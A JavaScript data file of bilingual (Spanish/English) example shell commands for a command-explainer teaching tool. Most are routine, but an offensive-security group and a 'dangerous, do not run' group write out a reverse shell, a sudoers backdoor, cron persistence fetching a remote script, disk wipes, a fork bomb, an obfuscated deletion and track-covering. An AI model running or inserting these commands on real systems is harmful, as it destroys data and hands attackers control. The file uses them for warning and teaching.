/* CmdLens · ejemplos clicables. Cada uno: cmd, título y por qué interesa (es/en). */
(function (root) {
  'use strict';
  const G = [
    {
      id: 'basicos', es: 'Para empezar', en: 'Getting started', items: [
        { c: 'ls -lah /var/log', es: ['Listar con detalle', 'Opciones agrupadas: -l (detalle), -a (ocultos), -h (tamaños legibles).'], en: ['Detailed listing', 'Grouped options: -l (detail), -a (hidden), -h (human sizes).'] },
        { c: 'tar -czvf copia.tar.gz ~/Documentos', es: ['Comprimir una carpeta', 'Cuatro opciones pegadas y un argumento con ~ que la shell expande.'], en: ['Compress a folder', 'Four options bundled together and a ~ argument the shell expands.'] },
        { c: 'tar xzvf copia.tar.gz', es: ['tar sin guion', 'tar acepta las opciones SIN «-» al principio (estilo antiguo).'], en: ['tar without a dash', 'tar accepts options WITHOUT a leading "-" (old style).'] },
        { c: 'du -sh * | sort -rh | head -10', es: ['Los 10 mayores', 'Tubería de tres comandos: tamaño → ordenar → los primeros diez.'], en: ['Top 10 biggest', 'Three-command pipeline: size → sort → first ten.'] },
        { c: 'ps aux | grep nginx | grep -v grep | awk \'{print $2}\'', es: ['PID de un proceso', 'Cuatro etapas conectadas por tuberías; «ps aux» sin guion es estilo BSD.'], en: ['PID of a process', 'Four stages joined by pipes; "ps aux" without a dash is BSD style.'] },
        { c: 'cat /etc/passwd | cut -d: -f1 | sort > usuarios.txt 2>&1', es: ['Redirecciones', '«>» sobrescribe y «2>&1» une errores y salida normal.'], en: ['Redirections', '">" overwrites and "2>&1" merges errors with normal output.'] },
        { c: 'mkdir -p proyecto/{src,docs,tests} && cd proyecto', es: ['Expansión de llaves', '{src,docs,tests} genera tres rutas; «&&» sigue solo si todo fue bien.'], en: ['Brace expansion', '{src,docs,tests} generates three paths; "&&" continues only on success.'] },
        { c: 'for f in *.jpg; do mv "$f" "foto_$f"; done', es: ['Un bucle for', 'Recorre los archivos que casan con el comodín y los renombra.'], en: ['A for loop', 'Walks the files matching the wildcard and renames them.'] },
      ],
    },
    {
      id: 'archivos', es: 'Archivos, permisos y búsqueda', en: 'Files, permissions and search', items: [
        { c: 'chmod u+x,g-w,o= script.sh', es: ['Permisos simbólicos', 'Tres cláusulas separadas por comas: añade, quita y fija permisos.'], en: ['Symbolic permissions', 'Three comma-separated clauses: add, remove and set permissions.'] },
        { c: 'chmod 640 secreto.txt && chown root:www-data secreto.txt', es: ['Permisos y propietario', 'Modo octal 640 y cambio de usuario:grupo.'], en: ['Permissions and owner', 'Octal mode 640 and a user:group change.'] },
        { c: 'find / -name "*.conf" -mtime -7 -type f 2>/dev/null', es: ['Buscar con find', 'Tres pruebas encadenadas y los errores descartados a /dev/null.'], en: ['Searching with find', 'Three chained tests and errors discarded to /dev/null.'] },
        { c: 'find /tmp -type f -name "*.log" -mtime +30 -exec rm {} \\;', es: ['find ejecuta otro comando', '-exec lanza «rm» por cada archivo encontrado: mira cómo se explica el comando interno.'], en: ['find runs another command', '-exec runs "rm" for each file found: see the inner command explained.'] },
        { c: 'grep -rniE "error|fail(ed)?" /var/log --include="*.log"', es: ['grep con regex', 'Opciones agrupadas y una expresión regular explicada pieza a pieza.'], en: ['grep with regex', 'Grouped options and a regular expression explained piece by piece.'] },
        { c: 'sed -i.bak -E \'s/^([a-z]+):x:/\\1:*:/\' usuarios.txt', es: ['sed con regex y copia de seguridad', 'sed explica su guion; -i.bak guarda copia antes de modificar.'], en: ['sed with regex and backup', 'sed explains its script; -i.bak keeps a backup before modifying.'] },
        { c: 'awk -F: \'$3 >= 1000 {print $1}\' /etc/passwd', es: ['awk filtrando columnas', 'Usuarios con UID de 1000 en adelante (cuentas normales).'], en: ['awk filtering columns', 'Users with UID 1000 and up (regular accounts).'] },
        { c: 'dd if=/dev/zero of=prueba.img bs=1M count=100 status=progress', es: ['dd con operandos clave=valor', 'dd no usa guiones: cada operando es clave=valor.'], en: ['dd with key=value operands', 'dd does not use dashes: each operand is key=value.'] },
      ],
    },
    {
      id: 'redes', es: 'Redes y servicios', en: 'Networking and services', items: [
        { c: 'ssh -L 8080:localhost:80 -N usuario@servidor.example.com', es: ['Túnel SSH', 'Reenvía un puerto local a través de la conexión cifrada.'], en: ['SSH tunnel', 'Forwards a local port through the encrypted connection.'] },
        { c: 'ssh admin@10.0.0.5 "sudo systemctl restart nginx"', es: ['Comando remoto', 'ssh ejecuta un comando en otro equipo; se explica el comando remoto.'], en: ['Remote command', 'ssh runs a command on another machine; the remote command is explained.'] },
        { c: 'rsync -avz --delete ./web/ usuario@host:/var/www/', es: ['Sincronizar a un servidor', '«--delete» borra en destino lo que no exista en origen.'], en: ['Sync to a server', '"--delete" removes at the destination whatever is missing at the source.'] },
        { c: 'curl -s -X POST -H "Content-Type: application/json" -d \'{"a":1}\' https://api.example.com/v1/items', es: ['Llamar a una API', 'Método, cabecera y cuerpo JSON de una petición HTTP.'], en: ['Calling an API', 'Method, header and JSON body of an HTTP request.'] },
        { c: 'ip -br addr show | grep UP', es: ['Direcciones IP', 'Subcomando «addr» de ip y filtro de interfaces activas.'], en: ['IP addresses', 'The "addr" subcommand of ip and a filter for active interfaces.'] },
        { c: 'systemctl status nginx --no-pager', es: ['Estado de un servicio', 'Subcomando status de systemctl.'], en: ['Service status', 'The status subcommand of systemctl.'] },
        { c: 'journalctl -u ssh --since today -p err', es: ['Registros del sistema', 'Errores de hoy del servicio SSH.'], en: ['System logs', 'Today\'s errors from the SSH service.'] },
        { c: 'sudo ufw allow from 192.168.1.0/24 to any port 22 proto tcp', es: ['Regla de cortafuegos', 'Permite SSH solo desde la red local.'], en: ['Firewall rule', 'Allows SSH only from the local network.'] },
      ],
    },
    {
      id: 'devops', es: 'Git, Docker y paquetes', en: 'Git, Docker and packages', items: [
        { c: 'git log --oneline --graph --all', es: ['Historia de Git', 'Subcomando «log» de git con sus opciones.'], en: ['Git history', 'The "log" subcommand of git with its options.'] },
        { c: 'git commit -am "fix: corrige el login"', es: ['Confirmar cambios', '-a (todo lo modificado) y -m (mensaje) pegados.'], en: ['Commit changes', '-a (everything modified) and -m (message) bundled together.'] },
        { c: 'docker run -d --name web -p 8080:80 -v "$(pwd)":/usr/share/nginx/html:ro nginx:alpine', es: ['Un contenedor web', 'Puertos, volumen de solo lectura y sustitución de comandos con $(pwd).'], en: ['A web container', 'Ports, read-only volume and the $(pwd) command substitution.'] },
        { c: 'sudo apt update && sudo apt install -y nginx', es: ['Instalar un paquete', 'Dos sudo encadenados con «&&».'], en: ['Install a package', 'Two sudo commands chained with "&&".'] },
        { c: 'pip install --user -r requirements.txt', es: ['Dependencias de Python', 'Instala en tu usuario, sin tocar el sistema.'], en: ['Python dependencies', 'Installs for your user, without touching the system.'] },
      ],
    },
    {
      id: 'hacking', es: 'Seguridad ofensiva (solo con autorización)', en: 'Offensive security (authorised use only)', items: [
        { c: 'nmap -sS -sV -p- -T4 --open 192.168.1.0/24 -oN escaneo.txt', es: ['Escaneo de puertos', 'Cada opción de nmap explicada, y el aviso legal.'], en: ['Port scan', 'Every nmap option explained, plus the legal notice.'] },
        { c: 'hydra -l admin -P rockyou.txt ssh://10.0.0.5 -t 4', es: ['Fuerza bruta de credenciales', 'Herramienta ofensiva: solo en laboratorio propio.'], en: ['Credential brute force', 'Offensive tool: only in your own lab.'] },
        { c: 'find / -perm -4000 -type f 2>/dev/null', es: ['Binarios SUID', 'Enumeración clásica para escalar privilegios (y para auditar).'], en: ['SUID binaries', 'Classic enumeration for privilege escalation (and for auditing).'] },
        { c: 'sudo tcpdump -i eth0 -nn -w captura.pcap port 443', es: ['Captura de tráfico', 'Guarda paquetes del puerto 443 en un archivo pcap.'], en: ['Traffic capture', 'Saves port 443 packets into a pcap file.'] },
        { c: 'john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hashes.txt', es: ['Crackeo de hashes', 'John the Ripper con diccionario.'], en: ['Hash cracking', 'John the Ripper with a wordlist.'] },
      ],
    },
    {
      id: 'peligro', es: 'Peligrosos (para clase: NO los ejecutes)', en: 'Dangerous (for class: do NOT run)', danger: true, items: [
        { c: 'rm -rf --no-preserve-root /', es: ['Borrar el sistema entero', 'El clásico. --no-preserve-root quita el seguro que rm trae de serie.'], en: ['Wipe the whole system', 'The classic. --no-preserve-root removes the safety rm ships with.'] },
        { c: ':(){ :|:& };:', es: ['Bomba fork', 'Una función que se invoca a sí misma sin fin hasta colgar el equipo.'], en: ['Fork bomb', 'A function that calls itself forever until the machine freezes.'] },
        { c: 'curl -fsSL https://instala.example.com/setup.sh | sudo bash', es: ['Descargar y ejecutar como root', 'Muy común en tutoriales: ejecutas lo que diga el servidor.'], en: ['Download and run as root', 'Very common in tutorials: you run whatever the server says.'] },
        { c: 'dd if=/dev/zero of=/dev/sda bs=1M', es: ['Sobrescribir el disco', 'Destruye el disco entero sin preguntar.'], en: ['Overwrite the disk', 'Destroys the entire disk without asking.'] },
        { c: 'chmod -R 777 /var/www', es: ['Permisos para todo el mundo', 'El «arreglo» más peligroso de «Permission denied».'], en: ['Permissions for everyone', 'The most dangerous "fix" for "Permission denied".'] },
        { c: 'rm -rf $DIRECTORIO/*', es: ['Variable sin comillas', 'Si la variable está vacía se borra /* — desastre clásico.'], en: ['Unquoted variable', 'If the variable is empty it deletes /* — a classic disaster.'] },
        { c: 'sudo echo "intruso ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers', es: ['Puerta trasera en sudoers', 'Además, la redirección no usa sudo (fallará… o no).'], en: ['Backdoor in sudoers', 'Also, the redirect does not use sudo (it fails… or does it).'] },
        { c: 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1', es: ['Reverse shell', 'Entrega una shell interactiva a otro equipo usando solo bash.'], en: ['Reverse shell', 'Hands an interactive shell to another host using only bash.'] },
        { c: 'echo "cm0gLXJmIH4v" | base64 -d | sh', es: ['Comando ofuscado', 'Se decodifica y se ejecuta sin que veas qué es.'], en: ['Obfuscated command', 'Decoded and executed without you seeing what it is.'] },
        { c: 'history -c && rm -f ~/.bash_history', es: ['Borrar las huellas', 'Anti-forense: elimina el historial de comandos.'], en: ['Covering tracks', 'Anti-forensics: wipes command history.'] },
        { c: '(crontab -l 2>/dev/null; echo "* * * * * curl -s http://203.0.113.9/a.sh | sh") | crontab -', es: ['Persistencia con cron', 'Cada minuto descarga y ejecuta un guion remoto.'], en: ['Persistence via cron', 'Every minute it downloads and runs a remote script.'] },
        { c: 'docker run --privileged -v /:/host --pid=host alpine chroot /host', es: ['Escape de contenedor', 'Contenedor con acceso total al anfitrión.'], en: ['Container escape', 'Container with full access to the host.'] },
        { c: 'iptables -F && iptables -P INPUT ACCEPT && ufw disable', es: ['Apagar el cortafuegos', 'Deja el equipo abierto a toda la red.'], en: ['Turn off the firewall', 'Leaves the machine open to the whole network.'] },
        { c: 'ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@10.0.0.5', es: ['SSH sin verificar el servidor', 'Hace posible la suplantación (man-in-the-middle).'], en: ['SSH without verifying the server', 'Makes impersonation (man-in-the-middle) possible.'] },
      ],
    },
  ];
  const api = { groups: G };
  if (typeof module !== 'undefined' && module.exports) module.exports = api; else root.CmdExamples = api;
})(typeof self !== 'undefined' ? self : this);
